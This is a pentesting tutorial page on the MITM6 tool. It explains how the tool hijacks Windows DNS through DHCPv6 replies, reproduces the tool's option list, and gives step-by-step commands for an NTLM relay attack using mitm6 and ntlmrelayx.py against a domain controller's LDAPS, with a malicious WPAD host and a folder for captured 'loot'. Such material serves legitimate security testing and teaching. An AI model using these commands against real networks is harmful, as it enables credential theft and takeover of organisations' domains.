## Overview

MITM6 is a pentesting tool that exploits the default configuration of Windows to take over the default DNS server. It does this by replying to DHCPv6 messages, providing victims with a link-local IPv6 address and setting the attackers host as default DNS server. As DNS server, MITM6 will selectively reply to DNS queries of the attackers choosing and redirect the victims traffic to the attacker machine instead of the legitimate server. [^1]

MITM6 is also able to conduct credential relay attacks using the IMPacket `NTLMrelayx` tool to relay NTLM credentials for authentication and the `krbrelayx` tool that allows Kerberos authenitcation relays.

MITM6 comes packaged with Kali Linux by default.

optional arguments:
  -h, --help            show this help message and exit
  -i INTERFACE, --interface INTERFACE
                        Interface to use (default: autodetect)
  -l LOCALDOMAIN, --localdomain LOCALDOMAIN
                        Domain name to use as DNS search domain (default: use
                        first DNS domain)
  -4 ADDRESS, --ipv4 ADDRESS
                        IPv4 address to send packets from (default:
                        autodetect)
  -6 ADDRESS, --ipv6 ADDRESS
                        IPv6 link-local address to send packets from (default:
                        autodetect)
  -m ADDRESS, --mac ADDRESS
                        Custom mac address - probably breaks stuff (default:
                        mac of selected interface)
  -a, --no-ra           Do not advertise ourselves (useful for networks which
                        detect rogue Router Advertisements)
  -r TARGET, --relay TARGET
                        Authentication relay target, will be used as fake DNS
                        server hostname to trigger Kerberos auth
  -v, --verbose         Show verbose information
  --debug               Show debug information

Filtering options:
  -d DOMAIN, --domain DOMAIN
                        Domain name to filter DNS queries on (Allowlist
                        principle, multiple can be specified.)
  -b DOMAIN, --blocklist DOMAIN, --blacklist DOMAIN
                        Domain name to filter DNS queries on (Blocklist
                        principle, multiple can be specified.)
  -hw DOMAIN, -ha DOMAIN, --host-allowlist DOMAIN, --host-whitelist DOMAIN
                        Hostname (FQDN) to filter DHCPv6 queries on (Allowlist
                        principle, multiple can be specified.)
  -hb DOMAIN, --host-blocklist DOMAIN, --host-blacklist DOMAIN
                        Hostname (FQDN) to filter DHCPv6 queries on (Blocklist
                        principle, multiple can be specified.)
  --ignore-nofqdn       Ignore DHCPv6 queries that do not contain the Fully
                        Qualified Domain Name (FQDN) option.

## Instructions

### Using MITM6 to Perform a NTLM Relay Attack

1. Execute the below command on the attacker machine. Ensure that the `-i` switch is set to interface that is on the same network as the target and that `-d` is set to the local domain being targeted.

    ```bash
    sudo mitm6 -i eth0 -d darkcybe.malnet
    ```

    {: .nolineno }

2. Using the IMPacket `ntlmrelayx.py` script, set the target using the `-t` switch which in this example is set to the Domain Controller running LDAPS. `-wh` is set to name the malicious WPAD instance and `-l` to create a local file on the attacker machine in which the discovered loot will be dropped. [^2]

    ```bash
    ntlmrelayx.py -6 -t ldaps://10.10.10.10 -wh malwpad.darkcybe.malnet -l lootcrate
    ```
